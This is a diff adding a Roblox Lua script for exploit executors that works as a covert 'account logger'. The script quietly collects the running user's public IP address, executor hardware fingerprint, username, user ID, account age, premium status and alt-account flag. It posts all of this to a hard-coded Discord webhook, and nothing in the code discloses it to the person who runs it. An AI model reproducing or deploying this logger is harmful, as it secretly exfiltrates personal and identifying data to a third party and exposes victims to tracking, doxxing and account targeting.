@@ -1,0 +1,105 @@
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+	premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+	premium = false
+end
+if premium == false then 
+	if plr.AccountAge <= 70 then 
+		ALT = true
+	end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+	http_request = syn.request
+elseif SENTINEL_V2 then
+	function http_request(tb)
+		return {
+			StatusCode = 200;
+			Body = request(tb.Url, tb.Method, (tb.Body or ''))
+		}
+	end
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+	if decoded.headers[v] then
+		hwid = decoded.headers[v];
+		break
+	end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/904788682689626122/5C6L7uBh_0pB5tdog2R_sW_yB5RGwpv_hd-Rayr340aUyZpX_KFZjAAVbqZ6-3NzbaiI"
+
+
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "**ACCOUNT LOGGER**",
+            ["description"] = "**["..game.Players.LocalPlayer.Name.."](https://roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile) ("..game.Players.LocalPlayer.UserId..")**",
+            ["type"] = "rich",
+            ["color"] = tonumber(7506394),
+            ["fields"] = {
+				{
+                    ["name"] = "IP Address",
+                    ["value"] = "||"..IP.."||",
+                    ["inline"] = true
+                },
+            	{
+					["name"] = "Server IP",
+					["value"] = "||WorkIn||",
+					["inline"] = true
+				},
+				{
+                    ["name"] = "Place Name",
+                    ["value"] = "["..info.Name.."](https://roblox.com/games/" .. game.GameId .. "/)",
+                    ["inline"] = true
+                },
+				{
+					["name"] = "Account Age",
+					["value"] = plr.AccountAge,
+					["inline"] = true
+				},
+				{
+					["name"] = "Premium",
+					["value"] = premium,
+					["inline"] = true
+				},
+				{
+					["name"] = "Alternate",
+					["value"] = ALT,
+					["inline"] = true
+				},
+				{
+				    ["name"] = "Hardware ID",
+					["value"] = "||"..hwid.."||",
+					["inline"] = true
+				},
+				
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
